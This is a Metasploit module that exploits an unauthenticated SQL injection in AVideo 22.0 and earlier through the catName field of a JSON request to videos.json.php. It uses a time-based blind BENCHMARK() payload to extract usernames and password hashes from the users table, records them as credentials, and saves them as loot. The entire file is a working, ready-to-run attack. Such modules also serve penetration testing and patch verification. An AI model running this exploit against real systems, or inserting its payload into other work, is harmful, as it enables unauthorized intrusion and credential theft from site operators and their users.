##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::SQLi
  include Msf::Auxiliary::Report
  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'AVideo Unauthenticated SQL Injection Credential Dump',
        'Description' => %q{
          AVideo <= 22.0 is vulnerable to unauthenticated SQL injection via the
          catName parameter in objects/videos.json.php (CVE-2026-28501).

          The security filter in security.php sanitizes GET/POST parameters but
          does not cover JSON request bodies. Since videos.json.php parses JSON
          input and merges it into $_REQUEST after the filter runs, a catName
          value sent as JSON bypasses sanitization entirely and reaches
          getCatSQL() unsanitized.

          This module uses time-based blind injection with BENCHMARK() to dump
          usernames and password hashes. SLEEP() is blocked by the sqlDAL
          prepared statement layer, but BENCHMARK(N*(condition), SHA1(x)) works
          because the condition is evaluated as a multiplier on the iteration
          count, avoiding the subquery restrictions imposed by prepare().

          Fixed in 24.0 (no 23.0 release exists).
        },
        'Author' => [
          'arkmarta', # Vulnerability discovery
          'Valentin Lobstein <chocapikk[at]leakix.net>' # Metasploit module
        ],
        'License' => MSF_LICENSE,
        'References' => [
          ['CVE', '2026-28501'],
          ['GHSA', 'pv87-r9qf-x56p', 'WWBN/AVideo']
        ],
        'DisclosureDate' => '2026-03-05',
        'DefaultOptions' => { 'SqliDelay' => 1 },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [true, 'The base path to AVideo', '/']),
      OptInt.new('COUNT', [true, 'Number of users to dump (default: all)', 0])
    ])
  end

  def check
    res = send_request_cgi('uri' => endpoint_uri, 'method' => 'GET')

    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res
    return Exploit::CheckCode::Safe("Unexpected HTTP #{res.code}") unless res.code == 200

    json = res.get_json_document
    return Exploit::CheckCode::Safe('Response is not valid JSON') if json.empty?
    return Exploit::CheckCode::Safe('Response missing expected fields') unless json.key?('total') && json.key?('rows')

    setup_sqli

    if @setup_sqli.test_vulnerable
      return Exploit::CheckCode::Vulnerable('Time-based blind SQLi confirmed via BENCHMARK()')
    end

    Exploit::CheckCode::Safe('Endpoint accessible but injection did not trigger')
  end

  def run
    setup_sqli

    columns = %w[user password]
    count = datastore['COUNT']
    print_status('Dumping user credentials from the users table...')
    print_warning('Time-based blind extraction is slow (~4s per character). Be patient.')
    data = @setup_sqli.dump_table_fields('users', columns, '', count)

    table = Rex::Text::Table.new(
      'Header' => 'AVideo Users',
      'Indent' => 4,
      'Columns' => columns
    )

    data.each do |row|
      table << row

      next if row[1].blank?

      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: row[0],
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(row[1]),
        private_data: row[1],
        service_name: ssl ? 'https' : 'http',
        address: rhost,
        port: rport,
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    end

    print_line(table.to_s)

    loot_data = data.map { |row| "#{row[0]}:#{row[1]}" }.join("\n")
    loot_path = store_loot('avideo.users', 'text/plain', rhost, loot_data, 'avideo_users.txt', 'AVideo User Credentials')
    print_good("Loot saved to: #{loot_path}")

    report_host(host: rhost)
    report_service(host: rhost, port: rport, proto: 'tcp', name: ssl ? 'https' : 'http')
    report_vuln(host: rhost, port: rport, proto: 'tcp', name: fullname, refs: references, info: description.strip)
  end

  private

  def endpoint_uri
    normalize_uri(target_uri.path, 'objects', 'videos.json.php')
  end

  def setup_sqli
    @setup_sqli ||= create_sqli(dbms: MySQLi::BenchmarkBasedBlind, opts: { hex_encode_strings: true, safe: true }) do |payload|
      body = { 'catName' => "' OR #{payload} AND '1'='1", 'doNotShowCatChilds' => 1 }.to_json

      send_request_cgi({
        'uri' => endpoint_uri,
        'method' => 'POST',
        'ctype' => 'application/json',
        'data' => body
      })
    end
  end
end
